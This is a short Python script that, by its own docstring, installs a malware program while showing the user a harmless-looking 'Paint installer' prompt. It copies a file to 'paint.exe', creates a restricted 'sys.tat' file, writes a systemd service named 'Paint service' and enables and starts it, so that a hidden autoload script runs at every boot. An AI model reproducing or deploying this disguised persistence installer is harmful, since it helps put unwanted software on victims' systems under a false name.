#!/usr/bin/env python3
import os
from shutil import copyfile


class Installer(object):
    """
    Class will install malware program
    """
    protect_file = "sys.tat"  # file that will save all the information of OS
    exec_file = "paint.exe"  # name of symlink to executable file
    link_file = "paint.py"  # name of executable file
    service_file = "autoload.py"  # name of autoload file
    service = "[Unit]\n" + \
              "Description=Paint service\n" + \
              "After=multi-user.target\n" + \
              "Conflicts=getty@tty1.service\n" + \
              "\n" + \
              "[Service]\n" + \
              "Type=simple\n" + \
              "ExecStart=/usr/bin/python3 {}\n" + \
              "StandardInput=tty-force\n" + \
              "\n" + \
              "[Install]\n" + \
              "WantedBy=multi-user.target\n"  # data of service file to autorun

    def initial(self):
        print("This is Paint installer.")
        direction = input("Enter path to install Paint (enter path split spaces): ").split(" ")

        # Create dirs if they are not exist
        path = os.path.join(os.sep, *direction)
        if not os.path.exists(path):
            os.makedirs(path)

        # Create symlink for executor
        copyfile(self.link_file, os.path.join(path, self.exec_file))
        os.chmod(os.path.join(path, self.exec_file), 0o700)

        # Create file for crypt info and give access
        with open(os.path.join(path, self.protect_file), "w+") as file:
            file.write("")
        os.chmod(os.path.join(path, self.protect_file), 0o600)

        # Create service for autorun
        with open(os.path.join(os.sep, "lib", "systemd", "system", "paint.service"), "w+") as service_file:
            service_file.write(self.service.format(os.path.join(path, self.service_file)))
        os.system("systemctl enable paint.service")
        os.system("systemctl start paint.service")


if __name__ == '__main__':
    install = Installer()
    install.initial()
